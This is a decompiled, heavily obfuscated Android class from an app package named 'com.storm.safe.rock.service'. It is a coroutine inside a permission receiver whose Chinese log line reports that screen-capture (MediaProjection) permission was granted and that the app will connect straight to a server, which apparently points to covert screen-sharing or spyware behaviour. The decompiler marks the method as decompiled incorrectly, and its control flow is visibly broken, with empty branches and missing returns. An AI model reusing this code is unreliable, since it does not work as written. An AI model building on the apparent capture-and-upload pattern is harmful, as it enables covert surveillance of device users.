package com.storm.safe.rock.service;

import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$permissionRequestReceiver$1$onReceive$11", m214403f = "dqtvuisjd.kt", m214404l = {5254, 5257, 5258}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
public final class dqtvuisjd$permissionRequestReceiver$1$onReceive$11 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52650a1;

    /* renamed from: a2 */
    public final /* synthetic */ dqtvuisjd f52651a2;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public dqtvuisjd$permissionRequestReceiver$1$onReceive$11(dqtvuisjd dqtvuisjdVar, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52651a2 = dqtvuisjdVar;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new dqtvuisjd$permissionRequestReceiver$1$onReceive$11(this.f52651a2, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((dqtvuisjd$permissionRequestReceiver$1$onReceive$11) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    /* JADX WARN: Removed duplicated region for block: B:22:0x004d A[RETURN] */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        C1351vv c1351vv = C1351vv.f60710b1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52650a1;
        dqtvuisjd dqtvuisjdVar = this.f52651a2;
        if (i == 0) {
            kg1.m213544f4(obj);
            this.f52650a1 = 1;
            if (b81.m210571b1(100L, this) != coroutineSingletons) {
            }
        }
        if (i != 1) {
            if (i != 2) {
                if (i != 3) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                kg1.m213544f4(obj);
                return c1351vv;
            }
            kg1.m213544f4(obj);
            this.f52650a1 = 3;
            dqtvuisjd.m211403a2(dqtvuisjdVar);
            return c1351vv != coroutineSingletons ? coroutineSingletons : c1351vv;
        }
        kg1.m213544f4(obj);
        t60.m214714d6("dqtvuisjd", "🎉 MediaProjection权限获取成功，直接连接服务器");
        this.f52650a1 = 2;
        if (dqtvuisjdVar.m211524m1(this) != coroutineSingletons) {
            this.f52650a1 = 3;
            dqtvuisjd.m211403a2(dqtvuisjdVar);
            if (c1351vv != coroutineSingletons) {
            }
        }
    }
}
